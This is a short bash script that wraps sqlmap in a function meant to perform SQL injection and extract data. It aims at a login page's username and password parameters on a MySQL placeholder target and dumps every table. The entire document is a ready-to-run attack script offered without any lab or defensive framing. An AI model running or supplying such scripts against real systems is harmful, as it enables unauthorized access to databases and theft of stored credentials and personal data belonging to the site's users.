#!/bin/bash

# Function to perform SQL injection and data extraction
function sqlmap_attack() {
    sqlmap -u "$1" --batch --dbms="$2" --tables --dump
}

# Target URL
target_url="http://example.com/login.php?username=test&password=test"

# Database management system
dbms="mysql"

# Run the function
sqlmap_attack "$target_url" "$dbms"